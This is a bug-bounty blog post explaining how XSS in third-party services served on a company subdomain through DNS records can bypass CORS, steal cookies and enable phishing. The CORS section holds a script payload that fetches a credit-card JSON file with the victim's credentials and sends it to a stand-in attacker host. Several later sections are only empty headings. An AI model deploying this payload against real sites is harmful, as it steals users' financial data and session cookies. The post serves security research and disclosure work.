---
layout: single
title: Exploitation through vulnerability inheritance - Attacking companies and scoring bounties through 3rd party integrations
date: 2021-02-15
classes: wide
header:
  teaser: /images/3rdparty_teaser.png
tags:

  -BugBounty
--- 

**Exploitation through vulnerability inheritance - Attacking companies and scoring bounties through 3rd party integrations**

![preview](/images/3rdparty_teaser.png)

## Agenda

During my last couple of months engaging with bug bounties on companies who hold responsible disclosure policy, I have encountered what might be called as some sort of routine, which helped me score bounties on companies regardless of their size.

This is due to what I will refer on this blog post as "Vulnerability Inheritance"

In this blog I'll cover the following:

![preview](/images/agenda.png)


### General

In today’s world, software companies are growing rapidly and so the need for new designs and features to implement ontop of the company current niche, which draws large portion of the software developers attention.

Companies will opt to “adopt” 3rd party services to achieve certain functionality goals, which would give them a "cheap" and time rewarding solution instead of investing manpower on maintaining and devloping certain "sideways" features which are already being maintaned and constantly developed by big companies.

While doing so is indeed rewarding and has many benefits, it do come out with a security price which needs to be considered and handeld correctly by the companies.

The 2 main methods in which we can integrate 3rd party services within our company domains are the following:

![2ways](/images/2ways.png)

The main area which I will cover are within the CNAME and A records integrations, for <script> and <iframe> integrations, there are several vulnerabilities which can arise and I'd suggest watching our Chief Architect at enso.security talk about postMessage exploitations which we had given earlier this year.

**Understanding CNAMES and A records**

CNAME records can be used to alias one name to another. CNAME stands for Canonical Name.
A common example is when you have both example.com and www.example.com pointing to the same application and hosted by the same server. 
To avoid maintaining two different records, it’s common to create:
* An A record for example.com pointing to the server IP address
* A CNAME record for www.example.com pointing to example.com

As a result, example.com points to the server IP address, and www.example.com points to the same address via example.com. If the IP address changes, you only need to update it in one place: just edit the A record for example.com, and www.example.com automatically inherits the changes.

**Understanding CNAMES and A records DNS flow**

![dns_cname](/images/cname_dns.png)

By observing the DNS flow above, you could already start to glimpse the point why security vulnerabilities are being arised from integrations as such.

There are 2 ways to implement 3rd party integrations through DNS records:

* Assigning a CNAME record from a subdomain to the 3rd party service, by doing so we "alias" the contents from the 3rd party website to serve on our subdomain.

* Assigning A record to an IP address which will run the vendor's service with slight modificatitions.

![flow_nagli](/images/flow.png)

After understanding the basics, we can dive deeper into the threat and attack models section

### Threat and attack models

![threat](/images/threat.png)

As we approach the threats and attack models phase, we need to understand that the main attack vectors we will look for are **Client Side Vulnerabilities**, this should make sense by now as we are attacking the company subdomain which is being served as an alias to third party service, in other words:

Achieveing RCE on the target would actually mean that we have remote code execution on the vendor's server
Achieving SSRF on the target would actually mean that we have Server Side Request Forgery from the vendor's IP
Achieveing XXE on the target would actually mean that we have XML External Entity attack on the vendor's server

Those attacks are severe and can affect the subdomain we are targeting, but as for the impact we are going for to the actual company we are targeting, it will still remain within the same attack models that we can achieve from Client Side Vulnerabilities on the specific subdomain.

I believe that Subdomain takeovers and Dangling dns records are wide known and understood with the community, there are bunch of great tutorials and explanations on these attacks and It's not the main discusstion area of the blog, yet it has to be mentioned and I'll share on the reconnaissance my methodology targeting and automatic the process of finding those.

![tko](/images/tko.png)

![dangling](/images/dangling.png)

Now, let's dive into the main part of the talk.

Client side vulnerabilities such as Cross Site Scripting and Open Redirects are often considered the most common bugs to be found by bug bounty hunters, as such many defence measures are being integrated and considered by companies todays such as implementing CSP (Content-Security-Policy), Deploying a WAF (Web Application Firewall), strict regex controls and sanitizing user input on all fields at all costs (Almost an impossible task).

Those solutions are good, although there are many WAF and CSP Bypasses which are being discovered from time to time, it will mostly do good job with protecting your companies domain from the straight forward attacks.

**But**,
When we integrate 3rd party service to our domain by pointing to it with a CNAME or A record, we are serving an alias of the vendors website, and the defense measures which we have taken throught the entire development process are no longer effective.

Upon integration we are being 100% dependent on the vendors security policy regarding vulnerabillities.

And this is where the **"Vulnerability Inheritance"** part comes to play, whenever we decide to integrate a new service, we will inherit it's entire security flaws to be served under our domain.

Let's take a quick look on the matter:

Assume we have found Stored XSS on a third party vendor, let's say on .welearn.com, and the company which we are targeting - target.com has a subdomain named study.target.com which points to target.welearn.com, target.com is well protected with strict CSP in place and up to date WAF.

Because study.target.com is a CNAME, it won't have any of these protections inplace, which could have blocked the XSS we have found on the 3rd party vendor.

Now, we will navigate to the subdomain and execute the XSS, as we could have anticipated it's affecting website as well as the vendors website, and the document.domain of the execution is being changed accordingly. 

![xss](/images/xss.png)

That's nice, so we found a vulnerability on a subdomain of our target.com company, and we have done so without tackling any of the defense in depth security measures being implemented on their domains. it's already a valid vulnerability if the company has wildcard domain inscope for assessment.

As I have encountered from time to time with my assessments, often the targeted companies won't realize the impact for such vulnerabilities, and they can issue a generic response as:

"Nice find, although the subdomain you have targeted is affecting 3rd party service which isn't under our control, and there is no impact by doing so."

The vulnerability itself indeed cannot be resolved by the company which we target, and they best mitigation considering the severity is to take down the website for maintanence until the vendor will fix it's flows.

Regarding the impact, it's subjective to the companies design and implementations, and it could be used as a chain to more severer actions.

**Bypassing CORS protections**

To those who are unfamilliar with the **Cross Origin Resource Sharing** mechanism:

Cross-Origin Resource Sharing (CORS) is an HTTP-header based mechanism that allows a server to indicate any other origins (domain, scheme, or port) than its own from which a browser should permit loading of resources.

Upon examining the main functions of our target website, if we come across the following set of headers and there is sensitive data being returned on the page, we defintly should stop and investigate what happens:

```javascript
Access-Control-Allow-Origin: https://galnagli.com
Access-Control-Allow-Credentials: true
```

When responding to a credentialed request, the server must specify an origin in the value of the Access-Control-Allow-Origin header, instead of specifying the `*` wildcard.

We want to make a request with the Access-Control-Allow-Credentials: true header, as it would allow fetching data with the user credentials attached (as authenticated personal).

Targets who set their CORS policy could have it assigned as "Wildcard" whenever dealing with requests which doesn't require authentication.
And as defense mechanism they would allow specifing the origin on authenticated requests only to be scope for the targets subdomains, such as 

```javascript
*.galnagli.com
```

It means that if we want to initiate a request from a subdomain of our target, we will specify it's name on the Allow-Origin header, which will look like the following:

```javascript
Access-Control-Allow-Origin: https://study.galnagli.com
Access-Control-Allow-Credentials: true
```

Now, as we have discovered Cross Site Scripting vulnerability on that subdomain, and although it occurres because of the 3rd party vendor misconfigurations, the origin of execution is being tied to our subdomain, which is inscope of making credential requests to the main domain as per our target configuration.

We can use our XSS to fetch sensitive information which is being stored on the parent domain by issuing a script similar to:

```javascript
<script>
var req = new XMLHttpRequest(); 
req.onload = reqListener; 
req.open('get','https://galnagli.com/creditcard.json',true); 
req.withCredentials = true;
req.send();

function reqListener() {
    location='//atttacker.net/log?key='+this.responseText; 
};
</script>
```

Storing this as the Cross Site Scripting payload will send to our attacker controlled server the creditcard.json authenticated response for each visitor who visits the affected subdomain and executes the script.


**Cookies exfiltration**

When companies are setting up cookies on their main websites, they tend to configure them with domain attribute, with makes them accessible and stored on the respective subdomains as well.

As per MDN:
```
Domain attribute
The Domain attribute specifies which hosts are allowed to receive the cookie. If unspecified, it defaults to the same host that set the cookie, excluding subdomains. If Domain is specified, then subdomains are always included. Therefore, specifying Domain is less restrictive than omitting it. However, it can be helpful when subdomains need to share information about a user.

For example, if Domain=mozilla.org is set, then cookies are available on subdomains like developer.mozilla.org.
```

It means that if we manage to find XSS vulnerability on our subdomain, we can exfiltrate the cookies which are being set on the parent domain, only if they are not protected by HTTPOnly flags.

We can use the cookies attached to issue requests from the victim perspective (such as CSRF attacks) regardless of the cookies being set to HTTPOnly.

![cookie](/images/cookie.png)

**Business Logic Errors**

Similar to the impact of subdomain takeover, instead of stealing the domain and to show a generic alert popup from that subdomain, we can use that subdomain to demonstrate legitimate service claiming to be on behalf of the original domain, while its actually being managed by the attacker.

Let's take to an example if we managed to takeover a shopify domain of the target domain, served on shop.target.com:

![business](/images/business.png)

**Open Redirect as a chain**

Assuming we have found open redirect on our vulnerable 3rd party vendor, which affects our subdomain shop.galnagli.com.
This could be used as a chain to more severe attacks, some companies would accept the open redirect as P4, but this should be considered last resort after trying to achieve greater affect and impact through different and more severe vulnerabilities such as Account Takeover or SSRF Bypasses.

**Account Takeover**

Let's take a look at the following example:

**SSRF Bypass**

### Reconnaissance

### Practical exploitations

### Takeaways


